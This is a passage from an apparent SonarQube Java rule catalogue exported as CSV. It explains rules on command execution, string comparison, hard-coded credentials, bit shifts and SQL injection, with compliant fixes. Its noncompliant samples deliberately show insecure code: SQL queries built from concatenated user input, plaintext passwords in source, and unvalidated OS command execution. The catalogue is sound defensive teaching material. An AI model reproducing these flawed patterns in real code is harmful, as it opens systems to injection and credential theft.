<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
Runtime.getRuntime().exec(...);  // Questionable. Validate the executed command.

ProcessBuilder pb = new ProcessBuilder(command);  // Questionable.
pb.command(command);  // Questionable.

// === apache.commons ===
import org.apache.commons.exec.CommandLine;
import org.apache.commons.exec.DefaultExecutor;

CommandLine cmdLine = CommandLine.parse(""bad.exe"");
DefaultExecutor executor = new DefaultExecutor();
executor.execute(cmdLine); // Questionable

</pre>
<h2>Exceptions</h2>
<p>The following code will not raise any issue.</p>
<pre>
ProcessBuilder pb = new ProcessBuilder();
pb.command();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2014-06-27T22:32:54+0200,"<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>
method inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>
<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots
suspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>Exceptions</h2>
<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>
<pre>
Class c;
if(c == Integer.class) { // No issue raised
}
</pre>
<p>Comparing <code>Enum</code> will not raise an issue:</p>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==
}
</pre>
<p>Comparing with <code>final</code> reference will not raise an issue:</p>
<pre>
private static final Type DEFAULT = new Type();

void foo(Type other) {
  if (other == DEFAULT) { // Compliant
  //...
  }
}
</pre>
<p>Comparing with <code>this</code> will not raise an issue:</p>
<pre>
  public boolean equals(Object other) {
    if (this == other) {  // Compliant
      return false;
    }
 }
</pre>
<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>
<h2>See</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS4973'>S4973</a> - Strings and Boxed types should be compared using ""equals()"" </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/595.html"">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/597.html"">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/wwD1AQ"">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/8AEqAQ"">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>",squid:S1698,java,Java,"<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>
method inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>
<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots
suspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>Exceptions</h2>
<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>
<pre>
Class c;
if(c == Integer.class) { // No issue raised
}
</pre>
<p>Comparing <code>Enum</code> will not raise an issue:</p>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==
}
</pre>
<p>Comparing with <code>final</code> reference will not raise an issue:</p>
<pre>
private static final Type DEFAULT = new Type();

void foo(Type other) {
  if (other == DEFAULT) { // Compliant
  //...
  }
}
</pre>
<p>Comparing with <code>this</code> will not raise an issue:</p>
<pre>
  public boolean equals(Object other) {
    if (this == other) {  // Compliant
      return false;
    }
 }
</pre>
<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>
<h2>See</h2>
<ul>
  <li> {rule:squid:S4973} - Strings and Boxed types should be compared using ""equals()"" </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/595.html"">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/597.html"">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/wwD1AQ"">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/8AEqAQ"">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>","""=="" and ""!="" should not be used when ""equals"" is overridden",[],MINOR,"['cert', 'cwe', 'suspicious']",CODE_SMELL
2013-10-18T18:10:14+0200,"<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn't make
sense because it causes its code to be executed in the current thread. </p>
<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.run(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.start(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/572.html"">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQAiAg"">CERT THI00-J.</a> - Do not invoke Thread.run() </li>
</ul>",squid:S1217,java,Java,"<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn't make
sense because it causes its code to be executed in the current thread. </p>
<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.run(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.start(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/572.html"">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQAiAg"">CERT THI00-J.</a> - Do not invoke Thread.run() </li>
</ul>","""Thread.run()"" should not be called directly",[],MAJOR,"['cert', 'cwe', 'multi-threading']",BUG
2019-01-28T11:20:06+0100,"<p>It's almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using
reference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/595.html"">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/597.html"">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/wwD1AQ"">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/8AEqAQ"">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>",squid:S4973,java,Java,"<p>It's almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using
reference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/595.html"">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/597.html"">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/wwD1AQ"">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/8AEqAQ"">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>","Strings and Boxed types should be compared using ""equals()""",[],MAJOR,"['cert', 'cwe']",BUG
2015-01-05T09:08:32+0100,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as ""oauthToken"", ""secret"", ...</p>
<h2>Noncompliant Code Example</h2>
<pre>
Connection conn = null;
try {
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user=steve&amp;password=blue""); // Noncompliant
  String uname = ""steve"";
  String password = ""blue"";
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user="" + uname + ""&amp;password="" + password); // Noncompliant

  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication(""userName"", ""1234"".toCharArray());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Connection conn = null;
try {
  String uname = getEncryptedUser();
  String password = getEncryptedPass();
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user="" + uname + ""&amp;password="" + password);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",squid:S2068,java,Java,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as ""oauthToken"", ""secret"", ...</p>
<h2>Noncompliant Code Example</h2>
<pre>
Connection conn = null;
try {
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user=steve&amp;password=blue""); // Noncompliant
  String uname = ""steve"";
  String password = ""blue"";
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user="" + uname + ""&amp;password="" + password); // Noncompliant

  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication(""userName"", ""1234"".toCharArray());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Connection conn = null;
try {
  String uname = getEncryptedUser();
  String password = getEncryptedPass();
  conn = DriverManager.getConnection(""jdbc:mysql://localhost/test?"" +
        ""user="" + uname + ""&amp;password="" + password);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",Credentials should not be hard-coded,"[{'key': 'credentialWords', 'htmlDesc': 'Comma separated list of words identifying potential credentials', 'defaultValue': 'password,passwd,pwd,passphrase,java.naming.security.credentials', 'type': 'STRING'}]",BLOCKER,"['cert', 'cwe', 'owasp-a2', 'sans-top25-porous']",VULNERABILITY
2015-02-17T07:18:47+0100,"<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. When the runtime shifts
32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an <code>int</code> by 32 is the same as shifting it
by 0, and shifting it by 33 is the same as shifting it by 1.</p>
<p>Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count operand and shifting <code>long</code> by 64 is the
same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 32; // Noncompliant
  return a &lt;&lt; 48;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 31;
  return a &lt;&lt; 16;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>",squid:S2183,java,Java,"<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. When the runtime shifts
32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an <code>int</code> by 32 is the same as shifting it
by 0, and shifting it by 33 is the same as shifting it by 1.</p>
<p>Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count operand and shifting <code>long</code> by 64 is the
same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 32; // Noncompliant
  return a &lt;&lt; 48;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 31;
  return a &lt;&lt; 16;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>",Ints and longs should not be shifted by zero or more than their number of bits-1,[],MINOR,[],BUG
2014-10-10T17:54:03+0200,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods from different frameworks which are susceptible to SQL injection if not used properly. Frameworks which are
covered are Java JDBC, JPA, JDO, Hibernate and Spring. The following specific method signatures are tested. Any SQL query built by concatenating or
formatting Strings is considered susceptible. The goal is to guide security code reviews.</p>
<ul>
  <li> <code>org.hibernate.Session.createQuery</code> </li>
  <li> <code>org.hibernate.Session.createSQLQuery</code> </li>
  <li> <code>java.sql.Statement.executeQuery</code> </li>
  <li> <code>java.sql.Statement.execute</code> </li>
  <li> <code>java.sql.Statement.executeUpdate</code> </li>
  <li> <code>java.sql.Statement.executeLargeUpdate</code> </li>
  <li> <code>java.sql.Statement.addBatch</code> </li>
  <li> <code>java.sql.Connection.prepareStatement</code> </li>
  <li> <code>java.sql.Connection.prepareCall</code> </li>
  <li> <code>java.sql.Connection.nativeSQL</code> </li>
  <li> <code>javax.persistence.EntityManager.createNativeQuery</code> </li>
  <li> <code>javax.persistence.EntityManager.createQuery</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.batchUpdate</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.execute</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.query</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForList</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForMap</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForObject</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForRowSet</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForInt</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForLong</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.update</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.&lt;init&gt;</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.newPreparedStatementCreator</code> </li>
  <li> <code>javax.jdo.PersistenceManager.newQuery</code> </li>
  <li> <code>javax.jdo.Query.setFilter</code> </li>
  <li> <code>javax.jdo.Query.setGrouping</code> </li>
</ul>
<p>If a method is defined in an interface, implementations are also tested. For example this is the case for
<code>org.springframework.jdbc.core.JdbcOperations</code> , which is usually used as <code>org.springframework.jdbc.core.JdbcTemplate</code>). </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  Statement stmt2 = null;
  PreparedStatement pstmt;
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery(""GETDATE()""); // Compliant; parameters not used here

    stmt2 = con.createStatement();
    ResultSet rs2 = stmt2.executeQuery(""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME="" + user);  // Noncompliant; parameter concatenated directly into query

    pstmt = con.prepareStatement(""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME="" + user);  // Noncompliant; parameter concatenated directly into query
    ResultSet rs3 = pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query = session.createQuery(  // Compliant
            ""FROM students where fname = "" + userInput);  // Noncompliant; parameter binding should be used instead
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  PreparedStatement pstmt = null;
  String query = ""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME=?""
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery(""GETDATE()"");

    pstmt = con.prepareStatement(query);
    pstmt.setString(1, user);  // Compliant; PreparedStatements escape their inputs.
    ResultSet rs2 = pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query =  session.createQuery(""FROM students where fname = ?"");
  query = query.setParameter(0,userInput);  // Parameter binding escapes all input
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",squid:S2077,java,Java,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods from different frameworks which are susceptible to SQL injection if not used properly. Frameworks which are
covered are Java JDBC, JPA, JDO, Hibernate and Spring. The following specific method signatures are tested. Any SQL query built by concatenating or
formatting Strings is considered susceptible. The goal is to guide security code reviews.</p>
<ul>
  <li> <code>org.hibernate.Session.createQuery</code> </li>
  <li> <code>org.hibernate.Session.createSQLQuery</code> </li>
  <li> <code>java.sql.Statement.executeQuery</code> </li>
  <li> <code>java.sql.Statement.execute</code> </li>
  <li> <code>java.sql.Statement.executeUpdate</code> </li>
  <li> <code>java.sql.Statement.executeLargeUpdate</code> </li>
  <li> <code>java.sql.Statement.addBatch</code> </li>
  <li> <code>java.sql.Connection.prepareStatement</code> </li>
  <li> <code>java.sql.Connection.prepareCall</code> </li>
  <li> <code>java.sql.Connection.nativeSQL</code> </li>
  <li> <code>javax.persistence.EntityManager.createNativeQuery</code> </li>
  <li> <code>javax.persistence.EntityManager.createQuery</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.batchUpdate</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.execute</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.query</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForList</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForMap</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForObject</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForRowSet</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForInt</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForLong</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.update</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.&lt;init&gt;</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.newPreparedStatementCreator</code> </li>
  <li> <code>javax.jdo.PersistenceManager.newQuery</code> </li>
  <li> <code>javax.jdo.Query.setFilter</code> </li>
  <li> <code>javax.jdo.Query.setGrouping</code> </li>
</ul>
<p>If a method is defined in an interface, implementations are also tested. For example this is the case for
<code>org.springframework.jdbc.core.JdbcOperations</code> , which is usually used as <code>org.springframework.jdbc.core.JdbcTemplate</code>). </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  Statement stmt2 = null;
  PreparedStatement pstmt;
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery(""GETDATE()""); // Compliant; parameters not used here

    stmt2 = con.createStatement();
    ResultSet rs2 = stmt2.executeQuery(""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME="" + user);  // Noncompliant; parameter concatenated directly into query

    pstmt = con.prepareStatement(""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME="" + user);  // Noncompliant; parameter concatenated directly into query
    ResultSet rs3 = pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query = session.createQuery(  // Compliant
            ""FROM students where fname = "" + userInput);  // Noncompliant; parameter binding should be used instead
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  PreparedStatement pstmt = null;
  String query = ""select FNAME, LNAME, SSN "" +
                 ""from USERS where UNAME=?""
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery(""GETDATE()"");

    pstmt = con.prepareStatement(query);
    pstmt.setString(1, user);  // Compliant; PreparedStatements escape their inputs.
    ResultSet rs2 = pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query =  session.createQuery(""FROM students where fname = ?"");
  query = query.setParameter(0,userInput);  // Parameter binding escapes all input
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
